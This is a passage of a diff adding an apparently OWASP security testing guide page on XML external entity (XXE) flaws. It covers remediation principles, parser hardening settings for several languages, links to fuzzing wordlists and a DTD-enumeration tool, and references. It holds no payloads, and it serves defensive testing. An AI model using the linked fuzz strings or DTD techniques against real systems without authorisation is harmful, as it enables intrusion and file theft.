+  <li><code class="language-plaintext highlighter-rouge">xmldom</code>: Review for any explicit entity-resolution configurations, as its default behaviors and capabilities have historically varied across versions.</li>
+</ul>
+
+<h2 id="remediation">Remediation</h2>
+
+<p>The most reliable fix for XXE-class issues is to remove the parser’s ability to resolve external resources at all, rather than trying to filter or sanitize XML input. General principles, in order of priority:</p>
+
+<ul>
+  <li><strong>Disable DTD processing entirely</strong> wherever the application does not have a genuine business need for it. Most application XML (API payloads, config uploads, form submissions converted to XML) never legitimately needs a DOCTYPE.</li>
+  <li>If DTDs cannot be disabled outright, <strong>disable resolution of external general and parameter entities</strong>, and <strong>disable XInclude processing</strong> - these are usually separate flags from the DTD toggle, so turning one off does not guarantee the other is off.</li>
+  <li>Prefer parser APIs/configuration flags described as “secure processing” where available, but verify what that flag actually covers for the specific parser/version in use rather than assuming it disables everything above.</li>
+  <li>Apply this configuration to <strong>every</strong> parser instantiation in the codebase and its dependencies, not just the main API layer - file upload handling, document conversion/preview generation, import/export jobs, SOAP clients, and third-party libraries each create their own parser instances and must be checked independently.</li>
+  <li>Where external entities are a genuine requirement, implement a strict <strong>allow-list</strong> of permitted URIs/schemes rather than relying on a <strong>block-list</strong> (deny-list) for dangerous protocols like <code class="language-plaintext highlighter-rouge">file://</code>, <code class="language-plaintext highlighter-rouge">ftp://</code>, etc.</li>
+  <li>Apply defense in depth: run XML-parsing processes with least privilege (no access to sensitive files, no outbound network access where not required), and keep XML libraries patched, since parser-level defaults and known bypasses change between versions.</li>
+</ul>
+
+<p>Quick reference by ecosystem (verify against current documentation for the exact library/version in use, since defaults have changed over time and vary by library):</p>
+
+<ul>
+  <li><strong>Java</strong>: set <code class="language-plaintext highlighter-rouge">DocumentBuilderFactory</code>/<code class="language-plaintext highlighter-rouge">SAXParserFactory</code>/<code class="language-plaintext highlighter-rouge">XMLInputFactory</code>/<code class="language-plaintext highlighter-rouge">TransformerFactory</code> (and <code class="language-plaintext highlighter-rouge">Xerces</code>-based parsers) to disable DOCTYPE declarations, external general/parameter entities, and XInclude.</li>
+  <li><strong>.NET</strong>: use <code class="language-plaintext highlighter-rouge">XmlReaderSettings</code> with <code class="language-plaintext highlighter-rouge">DtdProcessing</code> set to <code class="language-plaintext highlighter-rouge">Prohibit</code> and <code class="language-plaintext highlighter-rouge">XmlResolver</code> set to <code class="language-plaintext highlighter-rouge">null</code> (or a restrictive custom resolver).</li>
+  <li><strong>Python</strong>: prefer a hardened parsing library (e.g. <code class="language-plaintext highlighter-rouge">defusedxml</code>) instead of the standard library’s XML modules directly; for <code class="language-plaintext highlighter-rouge">lxml</code>, explicitly leave <code class="language-plaintext highlighter-rouge">resolve_entities</code> at its safe default (or set it to <code class="language-plaintext highlighter-rouge">False</code>) and avoid enabling network access on the parser.</li>
+  <li><strong>PHP</strong>: on PHP 8.0+, <code class="language-plaintext highlighter-rouge">libxml_disable_entity_loader()</code> is deprecated and largely unnecessary - PHP now requires libxml &gt;= 2.9.0, which disables external entity substitution by default, so a stock <code class="language-plaintext highlighter-rouge">DOMDocument</code>/<code class="language-plaintext highlighter-rouge">SimpleXML</code>/<code class="language-plaintext highlighter-rouge">libxml</code>-based parse on a current PHP version is not exploitable via the classic entity route unless the code explicitly re-enables it (e.g. via <code class="language-plaintext highlighter-rouge">LIBXML_NOENT</code> combined with <code class="language-plaintext highlighter-rouge">LIBXML_DTDLOAD</code>). Testers should therefore check for explicit opt-back-in flags on modern PHP rather than assuming the framework needs a disable call; on PHP &lt; 8.0 with older libxml, the disable call is still required. Either way, treat file-upload/document-conversion features that call third-party libraries separately, since those may bundle their own, differently-configured parser.</li>
+  <li><strong>Node.js</strong>: for <code class="language-plaintext highlighter-rouge">libxmljs</code>-based parsing, never set <code class="language-plaintext highlighter-rouge">noent: true</code> on untrusted input; prefer omitting the option (or setting it <code class="language-plaintext highlighter-rouge">false</code>) and pair with <code class="language-plaintext highlighter-rouge">nonet: true</code> to also block network-based entity resolution.</li>
+  <li><strong>C/C++ (libxml2)</strong>: avoid the options that enable network/entity loading (e.g. <code class="language-plaintext highlighter-rouge">XML_PARSE_NOENT</code>, <code class="language-plaintext highlighter-rouge">XML_PARSE_DTDLOAD</code>) unless explicitly required.</li>
+</ul>
+
+<p>For authoritative, parser-specific configuration snippets, defer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">XML External Entity (XXE) Prevention Cheat Sheet</a>, which is maintained separately and updated as parser behavior changes.</p>
+
+<h2 id="tools">Tools</h2>
+
+<ul>
+  <li><a href="https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt">XML Injection Fuzz Strings (from wfuzz tool)</a></li>
+  <li><a href="https://github.com/GoSecure/dtd-finder">dtd-finder</a> - a list of known local DTD file paths, plus a scanner that can enumerate DTDs present on a filesystem or inside a container/Docker image, useful for the local-DTD-repurposing technique above.</li>
+</ul>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="https://www.whitehatsec.com/glossary/content/xml-injection">XML Injection</a></li>
+  <li><a href="https://www.securityfocus.com/archive/1/297714">Gregory Steuck, “XXE (XML eXternal Entity) attack”</a></li>
+  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XXE Prevention Cheat Sheet</a></li>
+  <li><a href="https://portswigger.net/web-security/xxe">PortSwigger Web Security Academy – XML External Entity (XXE) Injection</a></li>
+  <li><a href="https://portswigger.net/web-security/xxe/blind">PortSwigger Web Security Academy – Blind XXE</a></li>
+  <li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">HackTricks – XXE / XEE</a></li>
+</ul>
+
+      </article>
+    </div>
+  </div>
+</main>
+<script src="/assets/js/doc-nav.js" defer></script>
+
+  <footer id="page-end" class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-standalone">
+      <a href="https://owasp.org/" class="footer-logo ext-link" rel="noopener noreferrer" aria-label="OWASP Foundation (external)">
+        <img src="/assets/images/owasp-logo-footer.svg" alt="OWASP Foundation" width="213" height="64" loading="lazy">
+      </a>
+      <p class="footer-tagline">An OWASP Foundation project. <a href="https://owasp.org/" class="ext-link" rel="noopener noreferrer">About OWASP</a></p>
+      <div class="footer-buttons">
+        <a href="https://github.com/OWASP/wstg" class="btn btn-primary btn-github btn-github--footer ext-link" rel="noopener noreferrer" target="_blank" aria-label="View on GitHub (opens in new window)">
+          <svg class="icon-github" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" width="16" height="16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 2.97-1.86 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+          View on GitHub
+        </a>
+      </div>
+      <p class="footer-back-to-top"><a href="#top" class="footer-back-to-top-link">Back to top</a></p>
+    </div>
+    <div class="footer-bottom">
+      <p class="footer-legal">OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc.</p>
+      <p class="footer-copy">&copy; 2026, OWASP Foundation Inc. All rights reserved.</p>
+    </div>
+  </div>
+</footer>
+
+<a href="#top" id="back-to-top" class="back-to-top" aria-label="Back to top" title="Back to top">
+  <svg class="back-to-top-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</a>
+
+  <script src="/assets/js/theme.js" defer></script>
+</body>
+</html>
